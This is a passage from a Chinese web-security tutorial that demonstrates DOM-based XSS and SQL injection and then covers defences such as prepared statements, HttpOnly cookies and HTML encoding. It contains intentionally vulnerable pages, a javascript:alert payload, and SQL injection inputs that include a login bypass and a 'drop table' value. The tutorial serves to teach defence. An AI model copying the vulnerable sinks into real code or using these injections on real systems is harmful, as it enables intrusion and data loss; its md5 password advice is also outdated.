    &lt;span&gt;//&lt;/span&gt;&lt;span&gt; http://127.0.0.1/xsstest.html?url=javascript:alert('xsstest'); &lt;/span&gt;
    &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 然后我们的是 s 的值就为如下：&lt;/span&gt;
&lt;span&gt;    s &lt;/span&gt;&lt;span&gt;=&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;?url=javascript:alert('xsstest')&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;
    s &lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt; s.substring(&lt;/span&gt;&lt;span&gt;1&lt;/span&gt;&lt;span&gt;, s.length);       &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 返回整个查询内容&lt;/span&gt;
    &lt;span&gt;var&lt;/span&gt;&lt;span&gt; url &lt;/span&gt;&lt;span&gt;=&lt;/span&gt; &lt;span&gt;&quot;&quot;&lt;/span&gt;&lt;span&gt;;                       &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 定义变量url&lt;/span&gt;
    &lt;span&gt;if&lt;/span&gt;&lt;span&gt; (s.indexOf(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;url=&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;) &lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt; &lt;span&gt;-&lt;/span&gt;&lt;span&gt;1&lt;/span&gt;&lt;span&gt;) {       &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 判断URL是否为空 &lt;/span&gt;
      &lt;span&gt;var&lt;/span&gt;&lt;span&gt; pos &lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt; s.indexOf(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;url=&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;) &lt;/span&gt;&lt;span&gt;+&lt;/span&gt; &lt;span&gt;4&lt;/span&gt;&lt;span&gt;;  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 过滤掉&quot;url=&quot;字符&lt;/span&gt;
&lt;span&gt;      url &lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt; s.substring(pos, s.length);  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 得到地址栏里的url参数&lt;/span&gt;
&lt;span&gt;    } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
      url &lt;/span&gt;&lt;span&gt;=&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;url参数为空&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;
    }
    document.write(&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;url: &amp;lt;a href=&quot;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt; &lt;span&gt;+&lt;/span&gt;&lt;span&gt; url &lt;/span&gt;&lt;span&gt;+&lt;/span&gt; &lt;span&gt;'&lt;/span&gt;&lt;span&gt;&quot;&amp;gt;&quot;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt; &lt;span&gt;+&lt;/span&gt;&lt;span&gt; url &lt;/span&gt;&lt;span&gt;+&lt;/span&gt; &lt;span&gt;'&lt;/span&gt;&lt;span&gt;&quot;&amp;lt;/a&amp;gt;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;); 
  &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;script&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;body&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;html&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;页面渲染完成后，点击弹窗如下所示：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/561794/201905/561794-20190522231742177-474046373.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2. 使用innerHTML直接输出导致浏览器解析恶意代码&lt;/strong&gt;&lt;br/&gt;代码如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;!&lt;/span&gt;&lt;span&gt;DOCTYPE html&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;html&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;head&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;meta &lt;/span&gt;&lt;span&gt;charset&lt;/span&gt;&lt;span&gt;=utf-8&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;meta &lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;=&quot;referrer&quot;&lt;/span&gt;&lt;span&gt; content&lt;/span&gt;&lt;span&gt;=&quot;never&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;title&lt;/span&gt;&lt;span&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;title&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;head&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;body&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;script &lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;=&quot;text/javascript&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;var&lt;/span&gt;&lt;span&gt; s &lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt; location.search;            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 返回URL中的查询部分（？之后的内容）&lt;/span&gt;
    &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 为了方便演示，我们假如url是 如下这样的&lt;/span&gt;
    &lt;span&gt;//&lt;/span&gt;&lt;span&gt; http://127.0.0.1/xsstest.html?url=javascript:alert('xsstest'); &lt;/span&gt;
    &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 然后我们的是 s 的值就为如下：&lt;/span&gt;
&lt;span&gt;    s &lt;/span&gt;&lt;span&gt;=&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;?url=javascript:alert('xsstest')&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;
    s &lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt; s.substring(&lt;/span&gt;&lt;span&gt;1&lt;/span&gt;&lt;span&gt;, s.length);       &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 返回整个查询内容&lt;/span&gt;
    &lt;span&gt;var&lt;/span&gt;&lt;span&gt; url &lt;/span&gt;&lt;span&gt;=&lt;/span&gt; &lt;span&gt;&quot;&quot;&lt;/span&gt;&lt;span&gt;;                       &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 定义变量url&lt;/span&gt;
    &lt;span&gt;if&lt;/span&gt;&lt;span&gt; (s.indexOf(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;url=&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;) &lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt; &lt;span&gt;-&lt;/span&gt;&lt;span&gt;1&lt;/span&gt;&lt;span&gt;) {       &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 判断URL是否为空 &lt;/span&gt;
      &lt;span&gt;var&lt;/span&gt;&lt;span&gt; pos &lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt; s.indexOf(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;url=&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;) &lt;/span&gt;&lt;span&gt;+&lt;/span&gt; &lt;span&gt;4&lt;/span&gt;&lt;span&gt;;  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 过滤掉&quot;url=&quot;字符&lt;/span&gt;
&lt;span&gt;      url &lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt; s.substring(pos, s.length);  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 得到地址栏里的url参数&lt;/span&gt;
&lt;span&gt;    } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
      url &lt;/span&gt;&lt;span&gt;=&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;url参数为空&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;
    }
  &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;script&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;div &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;='test'&lt;/span&gt;&lt;span&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span&gt;a &lt;/span&gt;&lt;span&gt;href&lt;/span&gt;&lt;span&gt;=&quot;&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;a&lt;/span&gt;&lt;span&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;div&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;script &lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;=&quot;text/javascript&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
      document.getElementById(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;).innerHTML &lt;/span&gt;&lt;span&gt;=&lt;/span&gt; &lt;span&gt;'&lt;/span&gt;&lt;span&gt;我的url是: &amp;lt;a href=&quot;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt; &lt;span&gt;+&lt;/span&gt;&lt;span&gt; url &lt;/span&gt;&lt;span&gt;+&lt;/span&gt; &lt;span&gt;'&lt;/span&gt;&lt;span&gt;&quot;&amp;gt;&quot;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt; &lt;span&gt;+&lt;/span&gt;&lt;span&gt; url &lt;/span&gt;&lt;span&gt;+&lt;/span&gt; &lt;span&gt;'&lt;/span&gt;&lt;span&gt;&quot;&amp;lt;/a&amp;gt;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;;
  &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;script&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;body&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;html&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;点击一样也会弹窗窗口的。也会一样执行xss攻击的。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3. 使用location/location.href/location.replace/iframe.src 造成的XSS&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;如下代码：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;!&lt;/span&gt;&lt;span&gt;DOCTYPE html&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;html&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;head&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;meta &lt;/span&gt;&lt;span&gt;charset&lt;/span&gt;&lt;span&gt;=utf-8&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;meta &lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;=&quot;referrer&quot;&lt;/span&gt;&lt;span&gt; content&lt;/span&gt;&lt;span&gt;=&quot;never&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;title&lt;/span&gt;&lt;span&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;title&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;head&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;body&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;script &lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;=&quot;text/javascript&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;var&lt;/span&gt;&lt;span&gt; s &lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt; location.search;            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 返回URL中的查询部分（？之后的内容）&lt;/span&gt;
    &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 为了方便演示，我们假如url是 如下这样的&lt;/span&gt;
    &lt;span&gt;//&lt;/span&gt;&lt;span&gt; http://127.0.0.1/xsstest.html?url=javascript:alert('xsstest'); &lt;/span&gt;
    &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 然后我们的是 s 的值就为如下：&lt;/span&gt;
&lt;span&gt;    s &lt;/span&gt;&lt;span&gt;=&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;?url=javascript:alert('xsstest')&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;
    s &lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt; s.substring(&lt;/span&gt;&lt;span&gt;1&lt;/span&gt;&lt;span&gt;, s.length);       &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 返回整个查询内容&lt;/span&gt;
    &lt;span&gt;var&lt;/span&gt;&lt;span&gt; url &lt;/span&gt;&lt;span&gt;=&lt;/span&gt; &lt;span&gt;&quot;&quot;&lt;/span&gt;&lt;span&gt;;                       &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 定义变量url&lt;/span&gt;
    &lt;span&gt;if&lt;/span&gt;&lt;span&gt; (s.indexOf(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;url=&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;) &lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt; &lt;span&gt;-&lt;/span&gt;&lt;span&gt;1&lt;/span&gt;&lt;span&gt;) {       &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 判断URL是否为空 &lt;/span&gt;
      &lt;span&gt;var&lt;/span&gt;&lt;span&gt; pos &lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt; s.indexOf(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;url=&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;) &lt;/span&gt;&lt;span&gt;+&lt;/span&gt; &lt;span&gt;4&lt;/span&gt;&lt;span&gt;;  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 过滤掉&quot;url=&quot;字符&lt;/span&gt;
&lt;span&gt;      url &lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt; s.substring(pos, s.length);  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 得到地址栏里的url参数&lt;/span&gt;
&lt;span&gt;    } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
      url &lt;/span&gt;&lt;span&gt;=&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;url参数为空&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;
    }
  &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;script&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;div &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;='test'&lt;/span&gt;&lt;span&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span&gt;a &lt;/span&gt;&lt;span&gt;href&lt;/span&gt;&lt;span&gt;=&quot;&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;a&lt;/span&gt;&lt;span&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;div&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;script &lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;=&quot;text/javascript&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
    location.href &lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt; url;
  &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;script&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;body&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;html&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;刷新下页面，也会弹出窗口执行 xss攻击了。&lt;/p&gt;

&lt;p&gt;五：SQL注入&lt;/p&gt;
&lt;p&gt;SQL注入是通过客户端的输入把SQL命令注入到一个应用的数据库中，从而执行恶意的SQL语句。&lt;br/&gt;什么意思呢？我们来打个比方：我们有一个登录框，需要输入用户名和密码对吧，然后我们的密码输入 'or '123' = '123 这样的。&lt;br/&gt;我们在查询用户名和密码是否正确的时候，本来执行的sql语句是：select * from user where username = '' and password = ''. 这样的sql语句，现在我们输入密码是如上这样的，然后我们会通过参数进行拼接，拼接后的sql语句就是：&lt;br/&gt;&lt;strong&gt;select * from user where username = '' and password = ' ' or '123' = '123 ';&lt;/strong&gt; 这样的了，那么会有一个or语句，只要这两个有一个是正确的话，就条件成立，因此 123 = 123 是成立的。因此验证就会被跳过。这只是一个简单的列子，比如还有密码比如是这样的：'; drop table user;, 这样的话，那么sql命令就变成了：&lt;br/&gt;&lt;strong&gt;select * from user where username = '' and password = ''; drop table user;'&lt;/strong&gt; , 那么这个时候我们会把user表直接删除了。&lt;/p&gt;
&lt;p&gt;sql被攻击的原因是：sql语句伪造参数，然后对参数进行拼接后形成xss攻击的sql语句。最后会导致数据库被攻击了。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;防范的方法：&lt;/strong&gt;&lt;br/&gt;1. 我们可以使用预编译语句(PreparedStatement，这样的话即使我们使用sql语句伪造成参数，到了服务端的时候，这个伪造sql语句的参数也只是简单的字符，并不能起到攻击的作用。&lt;br/&gt;2. 数据库中密码不应明文存储的，可以对密码使用md5进行加密，为了加大破解成本，所以可以采用加盐的方式。&lt;/p&gt;

&lt;p&gt;cookie安全策略&lt;/p&gt;
&lt;p&gt;在服务器端设置cookie的时候设置 http-only, 这样就可以防止用户通过JS获取cookie。对cookie的读写或发送一般有如下字段进行设置：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;http-only:&lt;/strong&gt; 只允许http或https请求读取cookie、JS代码是无法读取cookie的(document.cookie会显示http-only的cookie项被自动过滤掉)。发送请求时自动发送cookie.&lt;br/&gt;&lt;strong&gt;secure-only:&lt;/strong&gt; 只允许https请求读取，发送请求时自动发送cookie。&lt;br/&gt;&lt;strong&gt;host-only:&lt;/strong&gt; 只允许主机域名与domain设置完成一致的网站才能访问该cookie。&lt;/p&gt;

&lt;p&gt;X-XSS-Protection设置&lt;/p&gt;
&lt;p&gt;目前该属性被所有的主流浏览器默认开启XSS保护。该参数是设置在响应头中目的是用来防范XSS攻击的。它有如下几种配置：&lt;br/&gt;值有如下几种：默认为1.&lt;br/&gt;0：禁用XSS保护。&lt;br/&gt;1：启用XSS保护。&lt;br/&gt;1;mode=block; 启用xss保护，并且在检查到XSS攻击是，停止渲染页面。&lt;/p&gt;

&lt;p&gt;XSS防御HTML编码&lt;/p&gt;
&lt;p&gt;我们为什么要防御HTML编码呢？比如如下html代码：&amp;lt;div&amp;gt;${content}&amp;lt;/div&amp;gt;, 在div标签中存在一个输出变量${content}. 那么浏览器在解析的过程中，首先是html解析，当解析到div标签时，再解析 ${content}的内容，然后会将页面显示出来。&lt;br/&gt;那假如该 ${content} 的值是 &amp;lt;script&amp;gt;alert('XSS攻击')&amp;lt;/script&amp;gt; 这样的呢？因此该script脚本就会解析并且执行了，从而达到XSS的攻击目标。&lt;br/&gt;因此我们需要将不可信数据放入到html标签内(比如div、span等)的时候需要进行html编码。&lt;br/&gt;编码规则：将 &amp;amp; &amp;lt; &amp;gt; &quot; ' / 转义为实体字符。如下基本转义代码：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;49&quot;&gt;
&lt;pre&gt;
&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 使用正则表达式实现html编码&lt;/span&gt;
    &lt;span&gt;function&lt;/span&gt;&lt;span&gt; htmlEncodeByRegExp(str) {
      &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; s = ''&lt;span&gt;;
      &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (str.length === 0&lt;span&gt;) {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; s;
      }
      &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (s +&lt;span&gt; str)
        .replace(&lt;/span&gt;/&amp;amp;/g, &quot;&amp;amp;amp;&quot;&lt;span&gt;)
        .replace(&lt;/span&gt;/&amp;lt;/g, &quot;&amp;amp;lt;&quot;&lt;span&gt;)
        .replace(&lt;/span&gt;/&amp;gt;/g, &quot;&amp;amp;gt;&quot;&lt;span&gt;)
        .replace(&lt;/span&gt;/ /g, &quot;&amp;amp;nbsp;&quot;)
        .replace(/\'/g, &quot;&amp;amp;#39&quot;&lt;span&gt;)
        .replace(&lt;/span&gt;/\&quot;/g, &quot;&amp;amp;quot;&quot;&lt;span&gt;)
        .replace(&lt;/span&gt;/\//g, '&amp;amp;#x2F;'&lt;span&gt;);
    }
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 使用正则表达式实现html解码&lt;/span&gt;
    &lt;span&gt;function&lt;/span&gt;&lt;span&gt; htmlDecodeByRegExp(str) {
      &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; s = ''&lt;span&gt;;
      &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (str.length === 0&lt;span&gt;) {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; s;
      }
      &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (s +&lt;span&gt; str)
        .replace(&lt;/span&gt;/&amp;amp;amp;/g, &quot;&amp;amp;&quot;&lt;span&gt;)
        .replace(&lt;/span&gt;/&amp;amp;lt;/g, &quot;&amp;lt;&quot;&lt;span&gt;)
        .replace(&lt;/span&gt;/&amp;amp;gt;/g, &quot;&amp;gt;&quot;&lt;span&gt;)
        .replace(&lt;/span&gt;/&amp;amp;nbsp;/g, &quot; &quot;&lt;span&gt;)
        .replace(&lt;/span&gt;/&amp;amp;#39/g, &quot;\'&quot;&lt;span&gt;)
        .replace(&lt;/span&gt;/&amp;amp;quot;/g, &quot;\&quot;&quot;&lt;span&gt;)
        .replace(&lt;/span&gt;/&amp;amp;#x2F;/g, &quot;\/&quot;&lt;span&gt;);
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;实现demo如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;49&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;!&lt;/span&gt;&lt;span&gt;DOCTYPE html&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;html&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;head&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
      &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;meta &lt;/span&gt;&lt;span&gt;charset&lt;/span&gt;&lt;span&gt;=utf-8&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
      &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;meta &lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;=&quot;referrer&quot;&lt;/span&gt;&lt;span&gt; content&lt;/span&gt;&lt;span&gt;=&quot;never&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
      &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;title&lt;/span&gt;&lt;span&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;title&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;head&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;body&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
      &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;script &lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;=&quot;text/javascript&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 使用正则表达式实现html编码&lt;/span&gt;
        &lt;span&gt;function&lt;/span&gt;&lt;span&gt; htmlEncodeByRegExp(str) {
          &lt;/span&gt;&lt;span&gt;var&lt;/span&gt;&lt;span&gt; s &lt;/span&gt;&lt;span&gt;=&lt;/span&gt; &lt;span&gt;''&lt;/span&gt;&lt;span&gt;;
          &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (str.length &lt;/span&gt;&lt;span&gt;===&lt;/span&gt; &lt;span&gt;0&lt;/span&gt;&lt;span&gt;) {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; s;
          }
          &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; (s &lt;/span&gt;&lt;span&gt;+&lt;/span&gt;&lt;span&gt; str)
            .replace(&lt;/span&gt;&lt;span&gt;/&lt;/span&gt;&lt;span&gt;&amp;amp;&lt;/span&gt;&lt;span&gt;/&lt;/span&gt;&lt;span&gt;g, &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;&amp;amp;amp;&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
            .replace(&lt;/span&gt;&lt;span&gt;/&lt;/span&gt;&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;/&lt;/span&gt;&lt;span&gt;g, &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;&amp;amp;lt;&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
            .replace(&lt;/span&gt;&lt;span&gt;/&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;/&lt;/span&gt;&lt;span&gt;g, &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;&amp;amp;gt;&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
